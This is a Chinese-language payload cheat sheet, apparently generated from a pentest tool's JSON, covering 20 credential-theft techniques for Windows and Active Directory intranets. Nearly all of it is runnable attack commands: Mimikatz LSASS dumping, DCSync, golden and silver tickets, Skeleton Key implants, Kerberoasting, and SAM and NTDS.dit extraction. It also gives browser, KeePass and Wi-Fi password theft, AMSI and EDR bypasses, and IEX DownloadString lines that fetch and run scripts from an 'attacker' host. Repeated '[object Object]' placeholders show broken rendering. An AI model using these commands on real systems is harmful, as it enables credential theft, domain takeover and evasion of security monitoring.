# 凭证窃取 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（20 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. Mimikatz凭证抓取

- **id:** `mimikatz-creds`
- **分类:** 凭证窃取 / Mimikatz
- **tags:** `mimikatz` `credentials` `windows` `lsass`

使用Mimikatz抓取Windows系统凭证

**前置条件**

- 需要管理员权限
- 需要绕过杀毒软件
- Windows系统

**利用步骤**

#### 抓取所有凭证

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

抓取LSASS中的所有登录凭证

| 片段 | 说明 | 类型 |
|---|---|---|
| `privilege::debug` | 获取Debug权限，需要管理员权限 | command |
| `sekurlsa::logonpasswords` | 从LSASS导出所有登录凭证 | command |
| `exit` | 执行完毕后退出 | command |

> platform: `windows`

#### 导出LSASS

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

从LSASS转储文件中提取凭证

> platform: `windows`

#### Pass-the-Hash

```
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"
```

使用NTLM哈希进行Pass-the-Hash攻击

> platform: `windows`

#### DCSync攻击

```
mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"
```

模拟DC同步获取域内所有用户哈希

| 片段 | 说明 | 类型 |
|---|---|---|
| `lsadump::dcsync` | DCSync命令，模拟域控制器复制 | command |
| `/domain:` | 目标域名 | parameter |
| `/user:` | 要同步的用户 | parameter |

> platform: `windows`

#### 导出所有哈希

```
mimikatz.exe "lsadump::lsa /inject" "exit"
```

从LSA导出所有用户哈希

> platform: `windows`

#### 黄金票据

```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"
```

生成黄金票据获取域管理员权限

| 片段 | 说明 | 类型 |
|---|---|---|
| `kerberos::golden` | 生成黄金票据命令 | command |
| `/sid:` | 域SID | parameter |
| `/krbtgt:` | krbtgt账户的NTLM哈希 | parameter |

> platform: `windows`

#### 白银票据

```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"
```

生成白银票据访问特定服务

> platform: `windows`

**EDR 绕过**

#### PowerShell加载

```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
```

通过PowerShell远程加载Mimikatz

#### AMSI绕过

```
SET-ITEM -PATH "HKLM:\SOFTWARE\Microsoft\AMSI" -NAME "AllowBlocking" -VALUE 1; IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")
```

禁用AMSI后加载Mimikatz

#### 混淆执行

```
$a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
```

通过反射绕过AMSI

**OPSEC**

- Mimikatz会被大多数杀软检测
- 使用混淆或内存加载绕过检测
- 优先考虑使用其他更隐蔽的工具
- 操作LSASS会触发EDR告警

**教程**

[object Object]

---

### 2. Kerberoasting攻击

- **id:** `kerberoasting`
- **分类:** 凭证窃取 / Kerberos
- **tags:** `kerberoasting` `kerberos` `active-directory` `spn`

Kerberoasting攻击获取服务账户哈希

**前置条件**

- 域环境
- 任意域用户凭证
- 域内存在SPN账户

**利用步骤**

#### 发现SPN

```
setspn -T domain.com -Q */*
```

查询域内所有SPN

> platform: `windows`

#### 请求服务票据

```
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"
```

PowerShell请求Kerberos票据

> platform: `windows`

#### 导出票据

```
mimikatz.exe "kerberos::list /export" "exit"
```

使用Mimikatz导出Kerberos票据

> platform: `windows`

#### Rubeus请求

```
Rubeus.exe kerberoast /stats
```

使用Rubeus进行Kerberoasting

| 片段 | 说明 | 类型 |
|---|---|---|
| `Rubeus.exe` | Kerberos攻击工具 | command |
| `kerberoast` | Kerberoasting模块 | command |
| `/stats` | 显示统计信息 | parameter |

> platform: `windows`

#### Impacket GetUserSPNs

```
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request
```

使用Impacket获取服务票据

| 片段 | 说明 | 类型 |
|---|---|---|
| `GetUserSPNs.py` | Impacket Kerberoasting工具 | command |
| `-request` | 请求服务票据 | parameter |

> platform: `linux`

#### 离线破解

```
hashcat -m 13100 kerberoast.hash wordlist.txt
```

使用Hashcat破解Kerberos票据

| 片段 | 说明 | 类型 |
|---|---|---|
| `-m 13100` | Kerberos 5 TGS-REP模式 | parameter |

> platform: `linux`

**EDR 绕过**

#### RC4加密

```
Rubeus.exe kerberoast /rc4opsec
```

使用RC4加密，避免触发告警

**OPSEC**

- Kerberoasting不需要高权限
- 只需要任意域用户凭证
- 建议使用RC4加密避免检测

**教程**

[object Object]

---

### 3. AS-REP Roasting

- **id:** `asreproasting`
- **分类:** 凭证窃取 / Kerberos
- **tags:** `asreproasting` `kerberos` `active-directory`

AS-REP Roasting攻击获取用户哈希

**前置条件**

- 域环境
- 域中存在禁用Pre-auth的用户

**利用步骤**

#### Rubeus攻击

```
Rubeus.exe asreproast
```

使用Rubeus进行AS-REP Roasting

> platform: `windows`

#### Impacket攻击

```
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

使用Impacket获取AS-REP

| 片段 | 说明 | 类型 |
|---|---|---|
| `GetNPUsers.py` | Impacket AS-REP Roasting工具 | command |
| `-usersfile` | 用户列表文件 | parameter |
| `-format hashcat` | 输出hashcat格式 | parameter |

> platform: `linux`

#### 查找禁用Pre-auth用户

```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

查找禁用Pre-auth的用户

> platform: `windows`

#### 破解哈希

```
hashcat -m 18200 asrep.hash wordlist.txt
```

使用Hashcat破解AS-REP哈希

| 片段 | 说明 | 类型 |
|---|---|---|
| `-m 18200` | Kerberos 5 AS-REP模式 | parameter |

> platform: `linux`

**OPSEC**

- 不需要任何凭证
- 只需要用户名
- 禁用Pre-auth是错误配置

**教程**

[object Object]

---

### 4. LaZagne凭证抓取

- **id:** `lazagne-creds`
- **分类:** 凭证窃取 / 工具
- **tags:** `lazagne` `credentials` `browsers` `applications`

使用LaZagne抓取各种应用程序凭证

**前置条件**

- 目标机器访问权限
- LaZagne工具

**利用步骤**

#### 抓取所有凭证

```
laZagne.exe all
```

抓取所有支持的凭证

| 片段 | 说明 | 类型 |
|---|---|---|
| `laZagne.exe` | LaZagne凭证抓取工具 | command |
| `all` | 抓取所有模块 | parameter |

> platform: `windows`

#### 浏览器凭证

```
laZagne.exe browsers
```

抓取浏览器保存的密码

> platform: `windows`

#### WiFi凭证

```
laZagne.exe wifi
```

抓取WiFi密码

> platform: `windows`

#### 邮件客户端

```
laZagne.exe mails
```

抓取邮件客户端密码

> platform: `windows`

#### 数据库凭证

```
laZagne.exe databases
```

抓取数据库客户端密码

> platform: `windows`

#### Linux版本

```
python laZagne.py all
```

Linux版本抓取

> platform: `linux`

**EDR 绕过**

#### 混淆执行

```
python -c "exec(__import__(\"base64\").b64decode(\"BASE64_PAYLOAD\"))"
```

Base64编码执行

**OPSEC**

- LaZagne会被杀软检测
- 考虑使用混淆或内存加载
- 可以只运行特定模块

**教程**

[object Object]

---

### 5. SAM数据库导出

- **id:** `sam-dump`
- **分类:** 凭证窃取 / SAM
- **tags:** `sam` `hash` `windows` `local`

导出Windows SAM数据库获取本地账户哈希

**前置条件**

- 管理员权限
- Windows系统

**利用步骤**

#### reg导出

```
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
```

导出SAM和SYSTEM配置单元

| 片段 | 说明 | 类型 |
|---|---|---|
| `reg save` | 注册表导出命令 | command |
| `HKLM\SAM` | SAM配置单元路径 | value |
| `sam.hive` | 输出文件名 | value |

> platform: `windows`

#### Impacket解析

```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

使用Impacket解析SAM

| 片段 | 说明 | 类型 |
|---|---|---|
| `secretsdump.py` | Impacket凭证转储工具 | command |
| `-sam` | SAM文件 | parameter |
| `-system` | SYSTEM文件 | parameter |

> platform: `linux`

#### Mimikatz导出

```
mimikatz.exe "lsadump::sam" "exit"
```

使用Mimikatz导出SAM

> platform: `windows`

#### Volume Shadow Copy

```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.hive
```

从卷影副本复制SAM

> platform: `windows`

**OPSEC**

- 需要管理员权限
- 操作注册表可能触发告警
- 卷影副本方法更隐蔽

**教程**

[object Object]

---

### 6. NTDS.dit导出

- **id:** `ntds-dump`
- **分类:** 凭证窃取 / NTDS
- **tags:** `ntds` `active-directory` `hash` `domain`

导出Active Directory数据库获取所有域用户哈希

**前置条件**

- 域管理员权限
- 域控制器访问权限

**利用步骤**

#### ntdsutil快照

```
ntdsutil "activate instance ntds" "ifm" "create full c:\temp" "quit" "quit"
```

使用ntdsutil创建IFM快照

| 片段 | 说明 | 类型 |
|---|---|---|
| `ntdsutil` | Active Directory数据库工具 | command |
| `activate instance ntds` | 激活NTDS实例 | command |
| `ifm` | Install From Media模式 | command |

> platform: `windows`

#### Volume Shadow Copy

```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
```

从卷影副本复制NTDS.dit

> platform: `windows`

#### Impacket解析

```
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

使用Impacket解析NTDS.dit

> platform: `linux`

#### Impacket远程转储

```
secretsdump.py domain/admin:password@dc_ip -just-dc
```

远程转储域哈希

| 片段 | 说明 | 类型 |
|---|---|---|
| `-just-dc` | 只转储域数据 | parameter |

> platform: `linux`

#### Mimikatz DCSync

```
mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"
```

使用DCSync同步所有哈希

> platform: `windows`

**OPSEC**

- 需要域管理员权限
- DCSync方法更隐蔽
- 操作可能触发大量告警

**教程**

[object Object]

---

### 7. GPP密码提取

- **id:** `gpp-password`
- **分类:** 凭证窃取 / GPP
- **tags:** `gpp` `group-policy` `password` `xml`

提取组策略首选项中的密码

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### 查找GPP文件

```
find /domain/sysvol -name "*.xml" 2>/dev/null
```

查找SYSVOL中的XML文件

> platform: `linux`

#### PowerShell查找

```
Get-ChildItem -Path "\\domain.com\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\.xml$"}
```

PowerShell查找GPP文件

> platform: `windows`

#### PowerView提取

```
Get-NetGPPPassword
```

使用PowerView提取GPP密码

> platform: `windows`

#### gpp-decrypt

```
gpp-decrypt HASH
```

解密GPP密码哈希

| 片段 | 说明 | 类型 |
|---|---|---|
| `gpp-decrypt` | GPP密码解密工具 | command |

> platform: `linux`

#### Impacket提取

```
Get-GPPPassword.py domain/user:password@dc_ip
```

使用Impacket提取GPP密码

> platform: `linux`

**OPSEC**

- GPP密码是常见的信息泄露点
- 只需要普通域用户权限
- MS14-025修复后新密码不会被存储

**教程**

[object Object]

---

### 8. Mimikatz高级技巧

- **id:** `mimikatz-advanced`
- **分类:** 凭证窃取 / Mimikatz
- **tags:** `mimikatz` `credentials` `advanced`

Mimikatz高级凭证提取和利用技术

**前置条件**

- 管理员权限
- Mimikatz工具

**利用步骤**

#### DCSync攻击

```
lsadump::dcsync /domain:domain.com /user:Administrator
```

模拟DC同步获取域管哈希

| 片段 | 说明 | 类型 |
|---|---|---|
| `lsadump::dcsync` | DCSync模块，模拟域控制器复制 | command |
| `/domain:domain.com` | 目标域名 | parameter |
| `/user:Administrator` | 目标用户，获取其NTLM哈希 | parameter |

> platform: `windows`

#### 黄金票据生成

```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
```

生成黄金票据并注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `kerberos::golden` | 黄金票据模块 | command |
| `/sid:S-1-5-21-xxx` | 域SID | parameter |
| `/krbtgt:HASH` | krbtgt账户NTLM哈希 | parameter |
| `/ptt` | Pass-the-Ticket，直接注入内存 | parameter |

> platform: `windows`

#### 白银票据生成

```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
```

生成白银票据访问特定服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `/target:server` | 目标服务器 | parameter |
| `/service:cifs` | 服务类型，CIFS为文件共享 | parameter |
| `/rc4:HASH` | 服务账户NTLM哈希 | parameter |

> platform: `windows`

#### Skeleton Key植入

```
privilege::debug
misc::skeleton
```

植入万能密码mimikatz

| 片段 | 说明 | 类型 |
|---|---|---|
| `privilege::debug` | 获取Debug权限 | command |
| `misc::skeleton` | 植入Skeleton Key，密码为mimikatz | command |

> platform: `windows`

**教程**

[object Object]

---

### 9. 浏览器凭证提取

- **id:** `browser-creds`
- **分类:** 凭证窃取 / 浏览器
- **tags:** `browser` `credentials` `chrome` `firefox`

从浏览器中提取保存的密码和Cookie

**前置条件**

- 用户权限
- 浏览器已保存密码

**利用步骤**

#### Chrome密码提取

```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" | Copy-Item -Destination "C:\temp\Login Data"
```

复制Chrome登录数据库

> platform: `windows`

#### Chrome Cookie提取

```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" | Copy-Item -Destination "C:\temp\Cookies"
```

复制Chrome Cookie数据库

> platform: `windows`

#### 使用SharpWeb

```
SharpWeb.exe --browser chrome
```

使用SharpWeb提取浏览器凭证

> platform: `windows`

#### 使用HackBrowserData

```
hack-browser-data.exe -b chrome
```

提取Chrome所有数据

**教程**

[object Object]

---

### 10. DPAPI凭证提取

- **id:** `dpapi-creds`
- **分类:** 凭证窃取 / DPAPI
- **tags:** `dpapi` `credentials` `windows`

从DPAPI保护存储中提取凭证

**前置条件**

- 用户权限
- DPAPI master key

**利用步骤**

#### 枚举DPAPI凭据

```
Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -Force
```

查找DPAPI保护的凭据文件

> platform: `windows`

#### 使用Mimikatz解密

```
dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\XXX
```

解密DPAPI凭据

> platform: `windows`

#### 获取Master Key

```
sekurlsa::dpapi
```

从内存获取DPAPI master key

> platform: `windows`

**教程**

[object Object]

---

### 11. RDP凭证提取

- **id:** `rdp-creds`
- **分类:** 凭证窃取 / RDP
- **tags:** `rdp` `credentials` `windows`

提取保存的RDP连接密码

**前置条件**

- 用户权限
- 已保存RDP密码

**利用步骤**

#### 查找RDP文件

```
Get-ChildItem -Path "$env:USERPROFILE\Documents\*.rdp" -Recurse
```

查找RDP连接文件

> platform: `windows`

#### 提取RDP密码

```
cmdkey /list
```

列出保存的凭据

> platform: `windows`

#### 使用Mimikatz

```
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\XXX
```

解密RDP保存的密码

> platform: `windows`

**教程**

[object Object]

---

### 12. WiFi凭证提取

- **id:** `wifi-creds`
- **分类:** 凭证窃取 / WiFi
- **tags:** `wifi` `credentials` `windows`

提取保存的WiFi密码

**前置条件**

- 管理员权限
- 已连接WiFi

**利用步骤**

#### 列出WiFi配置文件

```
netsh wlan show profiles
```

显示所有WiFi配置文件

> platform: `windows`

#### 提取WiFi密码

```
netsh wlan show profile name="WiFi_Name" key=clear
```

显示WiFi密码

| 片段 | 说明 | 类型 |
|---|---|---|
| `netsh wlan show profile` | 显示WiFi配置 | command |
| `name="WiFi_Name"` | 指定WiFi名称 | parameter |
| `key=clear` | 以明文显示密码 | parameter |

> platform: `windows`

**教程**

[object Object]

---

### 13. Windows Vault凭证

- **id:** `vault-creds`
- **分类:** 凭证窃取 / Vault
- **tags:** `vault` `credentials` `windows`

从Windows凭据管理器提取凭证

**前置条件**

- 用户权限
- 已保存凭据

**利用步骤**

#### 列出Vault凭据

```
vaultcmd /list
```

列出所有Vault

> platform: `windows`

#### 导出Vault凭据

```
vaultcmd /listcreds:"Windows Credentials" /all
```

列出Windows凭据

> platform: `windows`

#### 使用Mimikatz

```
sekurlsa::credman
```

从内存提取凭据管理器密码

> platform: `windows`

**教程**

[object Object]

---

### 14. KeePass凭证提取

- **id:** `keepass-dump`
- **分类:** 凭证窃取 / KeePass
- **tags:** `keepass` `credentials` `password-manager`

从KeePass数据库提取密码

**前置条件**

- KeePass数据库文件
- 主密码或内存转储

**利用步骤**

#### 查找KeePass数据库

```
Get-ChildItem -Path C:\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue
```

搜索KeePass数据库文件

> platform: `windows`

#### 内存提取主密码

```
使用KeePassDump或KeeThief从内存提取主密码
```

从KeePass进程内存提取

> platform: `windows`

#### 使用KeeThief

```
powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/KeeThief.ps1'); Get-KeePassPw
```

PowerShell提取KeePass密码

> platform: `windows`

**教程**

[object Object]

---

### 15. LSA Secrets提取

- **id:** `lsa-secrets`
- **分类:** 凭证窃取 / LSA
- **tags:** `lsa` `secrets` `windows`

从LSA Secrets提取敏感数据

**前置条件**

- SYSTEM权限

**利用步骤**

#### 使用Mimikatz

```
lsadump::secrets
```

提取LSA Secrets

> platform: `windows`

#### 使用reg save

```
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive
```

导出注册表hive离线分析

> platform: `windows`

#### 使用Impacket

```
secretsdump.py -security security.hive -system system.hive LOCAL
```

离线提取LSA Secrets

> platform: `linux`

**教程**

[object Object]

---

### 16. 缓存凭证提取

- **id:** `cached-creds`
- **分类:** 凭证窃取 / 缓存
- **tags:** `cached` `credentials` `domain`

提取域缓存凭证

**前置条件**

- SYSTEM权限
- 域环境

**利用步骤**

#### 使用Mimikatz

```
lsadump::cache
```

提取缓存域凭证

> platform: `windows`

#### 使用reg save

```
reg save HKLM\SECURITY security.hive
```

导出SECURITY hive

> platform: `windows`

#### 离线破解

```
使用hashcat破解缓存的域凭证
```

缓存凭证可离线破解

> platform: `linux`

**教程**

[object Object]

---

### 17. DCSync攻击

- **id:** `dcsync-attack`
- **分类:** 凭证窃取 / 域渗透
- **tags:** `dcsync` `domain-controller` `mimikatz`

模拟域控制器同步获取凭证

**前置条件**

- 域管理员权限或特定权限

**利用步骤**

#### 使用Mimikatz

```
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
```

使用Mimikatz执行DCSync

| 片段 | 说明 | 类型 |
|---|---|---|
| `lsadump::dcsync` | DCSync模块 | command |
| `/domain:domain.com` | 目标域名 | parameter |
| `/user:Administrator` | 目标用户 | parameter |

> platform: `windows`

#### 使用impacket

```
python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip
```

使用impacket执行DCSync

> platform: `linux`

#### 导出所有哈希

```
mimikatz # lsadump::dcsync /domain:domain.com /all /csv
```

导出域内所有用户哈希

> platform: `windows`

#### 权限要求

```
需要以下权限之一:
- Domain Admin
- Enterprise Admin
- 复制目录更改权限
```

DCSync所需权限

**教程**

[object Object]

---

### 18. 黄金票据攻击

- **id:** `golden-ticket`
- **分类:** 凭证窃取 / 域持久化
- **tags:** `golden-ticket` `krbtgt` `kerberos`

使用krbtgt哈希生成黄金票据

**前置条件**

- krbtgt账户哈希
- 域SID

**利用步骤**

#### 获取krbtgt哈希

```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

获取krbtgt账户哈希

> platform: `windows`

#### 获取域SID

```
whoami /user
或: wmic useraccount get sid
```

获取域SID

> platform: `windows`

#### 生成黄金票据

```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

生成并注入黄金票据

| 片段 | 说明 | 类型 |
|---|---|---|
| `kerberos::golden` | 黄金票据模块 | command |
| `/user:Administrator` | 伪造的用户 | parameter |
| `/sid:S-1-5-21-xxx` | 域SID | parameter |
| `/krbtgt:HASH` | krbtgt NTLM哈希 | parameter |
| `/ptt` | 直接注入内存 | parameter |

> platform: `windows`

#### 验证票据

```
klist
或: dir \\dc.domain.com\c$
```

验证黄金票据是否有效

> platform: `windows`

**教程**

[object Object]

---

### 19. 白银票据攻击

- **id:** `silver-ticket`
- **分类:** 凭证窃取 / 域持久化
- **tags:** `silver-ticket` `kerberos` `service`

使用服务账户哈希生成白银票据

**前置条件**

- 服务账户哈希
- 域SID

**利用步骤**

#### 获取服务哈希

```
mimikatz # sekurlsa::logonpasswords
寻找服务账户NTLM哈希
```

获取服务账户哈希

> platform: `windows`

#### 生成白银票据

```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt
```

生成针对特定服务的票据

| 片段 | 说明 | 类型 |
|---|---|---|
| `/target:server.domain.com` | 目标服务器 | parameter |
| `/service:cifs` | 服务类型(CIFS) | parameter |
| `/rc4:HASH` | 服务账户NTLM哈希 | parameter |

> platform: `windows`

#### 常见服务类型

```
CIFS - 文件共享
HTTP - Web服务
LDAP - 目录服务
MSSQLSvc - SQL服务
HOST - 远程管理
```

可伪造的服务类型

**教程**

[object Object]

---

### 20. 无人值守安装凭证提取

- **id:** `unattended-creds`
- **分类:** 凭证窃取 / 文件凭证
- **tags:** `credentials` `unattend` `sysprep` `privilege-escalation` `windows`

从Windows无人值守安装文件(Unattend.xml/Sysprep)中提取明文或Base64编码的管理员凭证

**前置条件**

- 本地文件系统读取权限
- 目标使用过无人值守部署

**利用步骤**

#### 搜索无人值守安装文件

```
dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattended.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\sysprep.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul
```

在默认路径搜索Unattend/Sysprep配置文件，这些文件在Windows自动部署后可能残留在系统中

| 片段 | 说明 | 类型 |
|---|---|---|
| `dir /s /b` | 递归搜索并仅输出文件完整路径 | command |
| `C:\\Windows\\Panther\\` | Windows安装日志和配置默认存放目录 | value |
| `C:\\Windows\\System32\\Sysprep\\` | Sysprep系统准备工具配置目录 | value |
| `2>nul` | 抑制文件未找到的错误输出 | operator |

> platform: `windows`

#### 全盘搜索Unattend文件

```
# CMD方式
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# PowerShell方式
Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName
```

当默认路径找不到时，全盘递归搜索所有可能的无人值守文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `Get-ChildItem -Recurse` | PowerShell递归搜索 | command |
| `-Include` | 按通配符模式匹配文件名 | parameter |
| `-ErrorAction SilentlyContinue` | 忽略权限不足等错误 | parameter |

> platform: `windows`

#### 提取明文密码

```
# 查看文件内容
type C:\Windows\Panther\Unattend.xml

# 关键字段搜索
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell提取
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }
```

从Unattend.xml中提取密码字段，密码可能以明文或Base64编码形式存储在<Password>/<AdminPassword>/<AutoLogon>节点中

| 片段 | 说明 | 类型 |
|---|---|---|
| `findstr /i /c:` | 不区分大小写搜索指定字符串 | command |
| `Password` | 密码字段关键字 | value |
| `AdminPassword` | 管理员密码字段 | value |
| `AutoLogon` | 自动登录配置(含明文密码) | value |
| `[xml]$xml` | 将XML文件解析为PowerShell XML对象 | command |

> platform: `windows`

#### 解码Base64密码

```
# PowerShell解码Base64
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# 或者使用certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt
```

Unattend.xml中的密码如果以Base64编码存储，需要解码。Windows使用UTF-16LE编码，因此必须用Unicode解码而非ASCII

| 片段 | 说明 | 类型 |
|---|---|---|
| `[System.Text.Encoding]::Unicode` | UTF-16LE解码(Windows默认) | command |
| `FromBase64String` | Base64解码方法 | command |
| `certutil -decode` | 使用系统自带工具解码Base64 | command |

> platform: `windows`

#### 检查其他敏感安装文件

```
# 检查GPP(Group Policy Preferences)密码
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul

# 检查IIS配置文件
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"

# 检查VNC密码文件
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# 检查WiFi密码
netsh wlan show profiles
netsh wlan show profile name="目标WiFi" key=clear
```

除Unattend.xml外，其他位置也可能存储明文凭证

| 片段 | 说明 | 类型 |
|---|---|---|
| `cpassword` | GPP使用的AES加密密码字段(密钥已公开) | value |
| `sysvol` | 域控共享目录，所有域用户可读 | value |
| `reg query` | 查询注册表中的密码值 | command |

> platform: `windows`

#### 使用Metasploit自动化

```
# Metasploit模块
use post/windows/gather/enum_unattend
set SESSION 1
run

# 也可以使用
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump
```

使用Metasploit后渗透模块自动搜索和提取无人值守安装文件中的凭证

| 片段 | 说明 | 类型 |
|---|---|---|
| `post/windows/gather/enum_unattend` | 自动搜索并解析Unattend文件 | value |
| `post/windows/gather/credentials/gpp` | 提取GPP存储的凭证 | value |

> platform: `windows`

**EDR 绕过**

#### 绕过文件访问监控

```
# 使用Volume Shadow Copy读取被锁定的文件
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Panther\Unattend.xml C:\temp\u.xml

# 使用PowerShell流式读取避免文件锁
[IO.File]::ReadAllText("C:\Windows\Panther\Unattend.xml")
```

通过卷影副本或流式读取绕过文件访问监控

> platform: `windows`

**OPSEC**

- 读取文件操作通常不会触发警报，但大量文件搜索(dir /s)可能被EDR检测。建议直接检查已知路径而非全盘搜索。

**教程**

[object Object]

**参考**

- https://attack.mitre.org/techniques/T1552/001/
